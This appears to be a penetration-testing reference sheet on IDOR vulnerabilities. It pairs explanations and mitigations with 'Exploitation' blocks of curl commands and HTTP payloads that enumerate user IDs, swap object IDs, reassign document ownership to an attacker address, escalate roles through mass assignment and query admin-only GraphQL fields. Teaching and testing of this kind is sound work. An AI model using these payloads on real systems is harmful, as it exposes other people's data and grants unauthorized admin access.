# Insecure Direct Object References (IDOR)

IDOR is an access control vulnerability where the application exposes a direct reference
to an internal object (e.g. a database ID, filename, account number) and fails to verify
that the requesting user is authorized to access that specific object.

---

## Horizontal IDOR (Same-Role Object Access)

**Category:** IDOR / Broken Access Control
**Severity context:** High — view, modify, or delete another user's data without privilege
escalation.

### How to identify it
Find endpoints that use predictable object identifiers: numeric IDs in URL paths
(`/invoice/1234`), query parameters (`?user_id=42`), or request body fields
(`{"account": "1001"}`). Create two accounts, capture requests for the same resource,
and swap the identifier between accounts. If Account A can see Account B's data, you
have an IDOR.

### How it works
The application checks that the user is authenticated but does not verify that the
requested object belongs to that user. For example, `/api/invoice/123` returns the
invoice for any authenticated user — the server trusts the user not to change the ID.

### Exploitation
```bash
# Sequential numeric IDs — iterate
curl -b "session=valid" http://target.com/api/users/1001
curl -b "session=valid" http://target.com/api/users/1002
curl -b "session=valid" http://target.com/api/users/1003

# UUID enumeration (if predictable or leaked)
curl -b "session=valid" http://target.com/api/orders/a1b2c3d4-...

# POST body ID swapping
curl -X POST -b "session=attacker" \
  -H "Content-Type: application/json" \
  -d '{"user_id": 42, "action": "view_profile"}' \
  http://target.com/api/profile

# Increment in WebSocket messages
# Intercept WebSocket traffic and change user_id mid-session

# Mass assignment / privilege escalation via IDOR
# Change document ownership
PUT /api/document/55
{"owner": "attacker@evil.com"}
```

### Example
```
Request (as user bob):
GET /api/profile?id=1001
Response: {"id":1001,"name":"Bob","email":"bob@test.com"}

Modified request (still as user bob):
GET /api/profile?id=1002
Response: {"id":1002,"name":"Alice","email":"alice@test.com","ssn":"123-45-6789"}
```

### Mitigation
Every object access must verify ownership — not just authentication. Use
`WHERE user_id = ?` in queries that include the authenticated user's ID, not a
user-supplied one. Prefer UUIDs over sequential IDs (obscurity alone is not security,
but it raises the bar). Implement server-side access control checks in a reusable
middleware layer.

### References
- [OWASP: IDOR](https://owasp.org/www-community/vulnerabilities/Insecure_Direct_Object_References)
- [PortSwigger: IDOR](https://portswigger.net/web-security/access-control/idor)

---

## Vertical IDOR (Privilege Escalation)

**Category:** IDOR / Privilege Escalation
**Severity context:** Critical — escalate from user to admin or access admin-level objects.

### How to identify it
Look for admin-only endpoints or parameters that change user roles: `?role=user`,
`{"admin": false}`, `/api/admin/users`. Capture a user-level session and attempt to
access admin endpoints directly. Also check whether the API includes fields that can
be modified to escalate privileges.

### How it works
The application exposes admin functions through the same API as user functions but
relies on the UI to hide them. The server may check authentication but not authorization
for specific endpoints — or may trust client-supplied role flags.

### Exploitation
```bash
# Direct admin endpoint access as a regular user
curl -b "session=regular_user" http://target.com/admin/users
curl -b "session=regular_user" http://target.com/api/admin/list-all-users

# Role upgrade via body manipulation
POST /api/update-profile
{"role": "admin"}    # or "is_admin": true

# Parameter pollution
GET /api/user?id=42&id=1
# Some frameworks use the last value — changes context to another user

# GraphQL — request admin-only fields
POST /graphql
{"query": "query { users { id email role password } }"}
# If authorization is checked per-field, you may get partial data

# Insecure mass assignment from JSON body
PUT /api/user
{"id": 42, "is_admin": true, "plan": "enterprise"}
```

### Mitigation
Enforce authorization on every endpoint, not just the UI. Never trust client-supplied
role or permission flags. Use role-based access control (RBAC) checked server-side
on every request. Avoid mass assignment — use DTOs that explicitly define which fields
are writable by which role.

### References
- [OWASP: Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)
- [PortSwigger: Access control vulnerabilities](https://portswigger.net/web-security/access-control)
